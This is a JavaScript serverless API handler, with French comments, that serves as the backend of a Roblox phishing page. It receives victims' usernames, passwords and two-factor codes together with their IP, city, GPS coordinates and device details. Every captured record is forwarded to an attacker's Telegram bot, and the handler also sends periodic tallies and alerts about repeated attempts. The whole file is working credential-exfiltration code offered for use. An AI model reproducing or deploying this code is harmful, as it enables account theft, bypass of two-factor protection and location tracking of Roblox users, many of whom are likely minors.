export const config = {
  api: {
    bodyParser: true
  }
};

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================================
// STATISTIQUES & MÉMOIRE
// ============================================================
let dailyCount = 0;
let dailyAttempts = [];
let recentEmails = [];

// ============================================================
// ENVOI VERS TELEGRAM
// ============================================================
async function sendToTelegram(message) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return false;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: false
        })
      }
    );
    const data = await response.json();
    if (!data.ok) console.error('Erreur Telegram:', data.description);
    return data.ok;
  } catch (error) {
    console.error('Erreur Telegram:', error.message);
    return false;
  }
}

// ============================================================
// DÉTECTION DES TENTATIVES MULTIPLES
// ============================================================
function checkDuplicateEmail(email, ip) {
  const recent = recentEmails.filter(e => e.email === email);
  if (recent.length >= 3) {
    const alertMessage = `
⚠️ **ALERTE - TENTATIVES MULTIPLES ROBLOX** ⚠️

📧 Email: \`${email}\`
🔢 Nombre de tentatives: ${recent.length + 1}
🕐 Dernière tentative: ${new Date().toLocaleTimeString('fr-FR')}

🌐 IP: \`${ip}\`

🔴 Possible attaque par brute force !
    `;
    sendToTelegram(alertMessage);
    return true;
  }

  recentEmails.push({ email, ip, timestamp: Date.now() });
  setTimeout(() => {
    const index = recentEmails.findIndex(e => e.email === email && e.ip === ip);
    if (index > -1) recentEmails.splice(index, 1);
  }, 600000);

  return false;
}

// ============================================================
// STATISTIQUES QUOTIDIENNES
// ============================================================
function trackDailyAttempt(logEntry) {
  dailyAttempts.push({
    username: logEntry.username,
    ip: logEntry.ip,
    timestamp: logEntry.timestamp
  });
  dailyCount++;

  if (dailyCount % 10 === 0) {
    const summary = `
📊 **RAPPORT ROBLOX - ${dailyCount} TENTATIVES**

📅 Date: ${new Date().toLocaleDateString('fr-FR')}
👤 Tentatives totales: ${dailyCount}

🕐 Dernières tentatives:
${dailyAttempts.slice(-5).map((a, i) => 
    `${i+1}. \`${a.username}\` - ${a.ip} (${new Date(a.timestamp).toLocaleTimeString('fr-FR')})`
).join('\n')}
    `;
    sendToTelegram(summary);
  }

  const now = new Date();
  if (now.getHours() === 23 && now.getMinutes() >= 55) {
    const dailySummary = `
📊 **RAPPORT QUOTIDIEN ROBLOX**

📅 Date: ${new Date().toLocaleDateString('fr-FR')}
👤 Tentatives aujourd'hui: ${dailyCount}

🕐 Dernière tentative: ${dailyAttempts.length > 0 ? new Date(dailyAttempts[dailyAttempts.length-1].timestamp).toLocaleTimeString('fr-FR') : 'Aucune'}

📊 Total depuis le début: ${dailyCount}
    `;
    sendToTelegram(dailySummary);
    setTimeout(() => {
      dailyCount = 0;
      dailyAttempts = [];
    }, 60000);
  }
}

// ============================================================
// FORMATAGE DU MESSAGE TELEGRAM
// ============================================================
function formatTelegramMessage(data) {
  let message = '';

  if (data.step === 'credentials') {
    message = `
🟦 **ÉTAPE 1 - IDENTIFIANTS ROBLOX** 🟦

👤 **Identifiants**
👤 Nom utilisateur: \`${data.username || 'Non fourni'}\`
🔑 Mot de passe: \`${data.password || '*****'}\`

🌐 **Informations Réseau**
📍 IP: \`${data.ip || 'Non disponible'}\`
🌍 Localisation: \`${data.ipLocation || 'Non disponible'}\`
🏙️ Ville: \`${data.city || 'Non disponible'}\`
🛡️ VPN/Proxy: ${data.isVpn ? '⚠️ DÉTECTÉ' : '✅ Aucun'}`;

    if (data.geolocation && data.geolocation !== 'Refusé') {
      const coords = data.geolocation.split(',');
      if (coords.length === 2) {
        message += `
📍 **GPS**
📏 Latitude: \`${coords[0]}\`
📏 Longitude: \`${coords[1]}\`
🗺️ [Google Maps](https://www.google.com/maps?q=${coords[0]},${coords[1]})`;
      }
    }

    message += `
📱 **Appareil**
🖥️ Modèle: \`${data.deviceModel || 'Inconnu'}\`
🌐 Plateforme: \`${data.platform || 'N/A'}\`
🔋 Batterie: \`${data.batteryLevel || 'N/A'}\`
🍪 Cookies: \`${data.cookieEnabled ? '✅ Activés' : '❌ Désactivés'}\`

📅 \`${new Date(data.timestamp).toLocaleString('fr-FR')}\``;

  } else if (data.step === 'verification') {
    message = `
🔴 **ÉTAPE 2 - CODE 2FA ROBLOX** 🔴

🔑 **Code de vérification**
\`\`\`
${data.verification_code || 'Non fourni'}
\`\`\`

📅 \`${new Date(data.timestamp).toLocaleString('fr-FR')}\``;
  }

  return message;
}

// ============================================================
// HANDLER PRINCIPAL
// ============================================================
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'POST requis' });

  try {
    const data = req.body;
    console.log('📥 Données reçues:', JSON.stringify(data, null, 2));

    let ip = data.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let ipLocation = 'Non disponible';
    let city = 'Non disponible';
    let isVpn = false;

    if (ip) {
      try {
        const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,proxy,hosting`).then(r => r.json());
        if (ipInfo.status === 'success') {
          ipLocation = `${ipInfo.country || 'Inconnu'}, ${ipInfo.city || 'Inconnu'}`;
          city = ipInfo.city || 'Non disponible';
          isVpn = ipInfo.proxy || ipInfo.hosting || false;
        }
      } catch (error) {
        console.error('Erreur IP info:', error);
      }
    }

    if (data.username) {
      checkDuplicateEmail(data.username, ip);
    }

    const logEntry = { ...data, ip, ipLocation, city, isVpn };
    trackDailyAttempt(logEntry);

    await sendToTelegram(formatTelegramMessage(logEntry));

    res.status(200).json({ success: true, message: 'Données envoyées à Telegram' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
